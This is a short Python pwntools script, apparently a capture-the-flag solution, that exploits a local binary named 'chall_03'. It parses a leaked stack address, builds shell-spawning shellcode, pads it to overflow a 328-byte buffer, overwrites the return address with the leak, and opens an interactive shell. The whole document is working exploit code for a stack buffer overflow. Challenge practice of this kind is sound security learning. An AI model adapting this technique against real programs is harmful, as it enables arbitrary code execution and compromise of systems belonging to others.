from pwn import *
import re
'''
#Chall_03 exploit
'''
context.arch="amd64"

binary = context.binary = ELF('./chall_03')
p = process(binary.path)
resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
leak_as_int = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
print(hex(leak_as_int))

payload = asm(shellcraft.sh())
payload += b'A'* (328 - len(payload)) #0x140 + 8 = 328 (padding)
payload += p64(leak_as_int)

print("\n", payload," \n")

p.sendline(payload)
p.interactive()
